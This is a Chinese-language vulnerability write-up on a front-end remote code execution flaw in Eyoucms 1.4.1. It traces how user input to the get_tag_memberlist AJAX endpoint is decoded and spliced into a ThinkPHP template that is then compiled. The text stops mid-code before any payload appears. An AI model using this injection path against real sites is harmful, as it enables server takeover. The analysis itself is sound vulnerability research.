<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="eyoucms-141-前台rce"><span class="csDE05BCC">Eyoucms 1.4.1 </span><span class="csECDA2D3">前台</span><span class="csDE05BCC">rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Eyoucms 1.4.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">进入</span><span class="cs9FB05234">/application/api/controller/Ajax.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">function get_tag_memberlist</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function get_tag_memberlist()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (IS_AJAX_POST) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$htmlcode = input(&#39;post.htmlcode/s&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$htmlcode = htmlspecialchars_decode($htmlcode);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$attarray = input(&#39;post.attarray/s&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$attarray = htmlspecialchars_decode($attarray);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$attarray = json_decode(base64_decode($attarray));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs7FFD2630">拼接完整的</span><span class="cs9FB05234">memberlist</span><span class="cs7FFD2630">标签语法</span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$innertext = &quot;{eyou:memberlist&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($attarray as $key =&gt; $val) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (in_array($key, [&#39;js&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$innertext .= &quot; {$key}=&#39;{$val}&#39;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$innertext .= &quot; js=&#39;on&#39;}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$innertext .= $htmlcode;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$innertext .= &quot;{/eyou:memberlist}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*--end*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$msg = $this-&gt;display($innertext); // </span><span class="cs7FFD2630">渲染模板标签语法</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;msg&#39;] = $msg;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;success(&#39;</span><span class="cs7FFD2630">读取成功！</span><span class="cs9FB05234">&#39;, null, $data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;error(&#39;</span><span class="cs7FFD2630">加载失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3 Line: </span><span class="cs9C1B1871">判断是否</span><span class="cs8926E06">AJAX</span><span class="cs9C1B1871">请求</span><span class="cs8926E06"><br/>4 Line: </span><span class="cs9C1B1871">从</span><span class="cs8926E06">post</span><span class="cs9C1B1871">获取用户输入参数</span><span class="cs8926E06">htmlcode</span><span class="cs9C1B1871">的值并将结果赋值给</span><span class="cs8926E06">$htmlcode<br/>5 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$htmlcode</span><span class="cs9C1B1871">中的实体字符转换为正常字符</span><span class="cs8926E06"><br/>7 Line: </span><span class="cs9C1B1871">从</span><span class="cs8926E06">post</span><span class="cs9C1B1871">获取用户输入参数</span><span class="cs8926E06">attarray</span><span class="cs9C1B1871">的值并将结果赋值给</span><span class="cs8926E06">$attarray<br/>8 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$attarray</span><span class="cs9C1B1871">中的实体字符转换为正常字符</span><span class="cs8926E06"><br/>9 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$attarray</span><span class="cs9C1B1871">进行</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">解码再</span><span class="cs8926E06">json</span><span class="cs9C1B1871">解码</span><span class="cs8926E06"><br/>12 Line: </span><span class="cs9C1B1871">定义标签</span><span class="cs8926E06"><br/>13~18 Line: </span><span class="cs9C1B1871">使用</span><span class="cs8926E06">foreach</span><span class="cs9C1B1871">将</span><span class="cs8926E06">$attay</span><span class="cs9C1B1871">以键值对的方式遍历出来，判断每一个元素是否为</span><span class="cs8926E06">js</span><span class="cs9C1B1871">如果是那么直接进入下一次循环，否则</span><span class="cs8926E06">&ldquo;{$key}=&rsquo;{$val}&rsquo;&rdquo;</span><span class="cs9C1B1871">连接到标签后面</span><span class="cs8926E06"><br/>19 Line: </span><span class="cs9C1B1871">闭合第一个标签</span><span class="cs8926E06"><br/>20 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$htmlcode</span><span class="cs9C1B1871">拼接到标签后，作为内容使用</span><span class="cs8926E06"><br/>21 Line: </span><span class="cs9C1B1871">将闭合标签拼接到</span><span class="cs8926E06">$innertext</span><span class="cs9C1B1871">中</span><span class="cs8926E06"><br/>23 Line: </span><span class="cs9C1B1871">调用基类中的</span><span class="cs8926E06">display</span><span class="cs9C1B1871">方法并将</span><span class="cs8926E06">$innertext</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/Controll.php</span><span class="cs9C1B1871">文件中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">display</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">protected function display($content = &#39;&#39;, $vars = [], $replace = [], $config = [])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $this-&gt;view-&gt;display($content, $vars, $replace, $config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3 Line: </span><span class="cs9C1B1871">调用视图类中的</span><span class="cs8926E06">display</span><span class="cs9C1B1871">方法，并将</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$replace</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/View.php</span><span class="cs9C1B1871">文件中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">display</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function display($content, $vars = [], $replace = [], $config = [])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $this-&gt;fetch($content, $vars, $replace, $config, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3 Line: </span><span class="cs9C1B1871">调用当前类中的</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">方法并将并将</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$replace</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/View.php</span><span class="cs9C1B1871">文件中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">fetch</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">模板变量</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$vars = array_merge(self::$var, $this-&gt;data, $vars);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">页面缓存</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_implicit_flush(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">渲染输出</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">允许用户自定义模板的字符串替换</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$replace = array_merge($this-&gt;replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;), $replace); // </span><span class="cs7FFD2630">解决一个页面上调用多个钩子的冲突问题</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs7FFD2630">插件模板字符串替换，不能放在构造函数，毕竟构造函数只执行一次</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if ($this-&gt;__isset(&#39;weappInfo&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;&nbsp;$weappInfo = $this-&gt;__get(&#39;weappInfo&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;&nbsp;if (!empty($weappInfo[&#39;code&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$replace[&#39;__WEAPP_TEMPLATE__&#39;] = ROOT_DIR.&#39;/&#39;.WEAPP_DIR_NAME.&#39;/&#39;.$weappInfo[&#39;code&#39;].&#39;/template&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*--end*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;engine-&gt;$method($template, $vars, $config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (\Exception $e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ob_end_clean();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw $e;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">获取并清空缓存</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = ob_get_clean();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">内容过滤标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Hook::listen(&#39;view_filter&#39;, $content);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// $this-&gt;checkcopyr($content);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $content;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">4 Line: </span><span class="cs9C1B1871">将当前类中的成员属性</span><span class="cs8926E06">$var</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$data</span><span class="cs9C1B1871">以及传入的</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">合并为一个数组并赋给</span><span class="cs8926E06">$vars<br/>7~8 Line: </span><span class="cs9C1B1871">开启页面缓存</span><span class="cs8926E06"><br/>11 Line: </span><span class="cs9C1B1871">使用三元运算符判断外部传入的</span><span class="cs8926E06">$renderContent</span><span class="cs9C1B1871">是否为真，若为真那么将</span><span class="cs8926E06">display</span><span class="cs9C1B1871">赋值给</span><span class="cs8926E06">$method</span><span class="cs9C1B1871">，否则将</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">赋值给</span><span class="cs8926E06">$method<br/>24 Line: </span><span class="cs9C1B1871">调用</span><span class="cs8926E06">Think</span><span class="cs9C1B1871">类中的</span><span class="cs8926E06">$method</span><span class="cs9C1B1871">方法并将</span><span class="cs8926E06">$template</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/view/driver/Think.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">display</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function display($template, $data = [], $config = [])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;template-&gt;display($template, $data, $config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3 Line: </span><span class="cs9C1B1871">调用模板类中的</span><span class="cs8926E06">display</span><span class="cs9C1B1871">方法并将</span><span class="cs8926E06">$template</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$data</span><span class="cs9C1B1871">、</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/Template.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">display</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function display($content, $vars = [], $config = [])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($vars) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;data = $vars;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($config) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;config($config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cacheFile = $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($content) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!$this-&gt;checkCache($cacheFile)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">缓存无效</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">模板编译</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;compiler($content, $cacheFile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取编译存储</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3~5 Line: </span><span class="cs9C1B1871">判断外部传入的</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">是否有值，若有那么则将</span><span class="cs8926E06">$vars</span><span class="cs9C1B1871">赋值给当前类中的成员属性</span><span class="cs8926E06">data</span><span class="cs9C1B1871">中</span><span class="cs8926E06"><br/>6~8 Line: </span><span class="cs9C1B1871">判断</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">是否有值，若有那么将</span><span class="cs8926E06">$config</span><span class="cs9C1B1871">传入当前类中的</span><span class="cs8926E06">config</span><span class="cs9C1B1871">方法</span><span class="cs8926E06"><br/>9 Line: </span><span class="cs9C1B1871">生成缓存文件名称赋值给</span><span class="cs8926E06">$cacheFile<br/>10~13 Line: </span><span class="cs9C1B1871">判断是否没有</span><span class="cs8926E06">$cacheFile</span><span class="cs9C1B1871">这个缓存文件，为真则调用当前类中的</span><span class="cs8926E06">compiler</span><span class="cs9C1B1871">方法并且将</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">及</span><span class="cs8926E06">$cacheFile</span><span class="cs9C1B1871">传入其中</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/Template.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">compiler</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function compiler(&amp;$content, $cacheFile)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">判断是否启用布局</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($this-&gt;config[&#39;layout_on&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (false !== strpos($content, &#39;{__NOLAYOUT__}&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">可以单独定义不使用布局</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_replace(&#39;{__NOLAYOUT__}&#39;, &#39;&#39;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取布局模板</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$layoutFile = $this-&gt;parseTemplateFile($this-&gt;config[&#39;layout_name&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($layoutFile)) { // </span><span class="cs7FFD2630">引入模板的错误友好提示</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = !empty($layoutFile[&#39;msg&#39;]) ? $layoutFile[&#39;msg&#39;] : $content;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if ($layoutFile) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">替换布局的主体内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_replace($this-&gt;config[&#39;layout_item&#39;], $content, file_get_contents($layoutFile));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_replace(&#39;{__NOLAYOUT__}&#39;, &#39;&#39;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">模板解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parse($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($this-&gt;config[&#39;strip_space&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* </span><span class="cs7FFD2630">去除</span><span class="cs9FB05234">html</span><span class="cs7FFD2630">空格与换行</span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 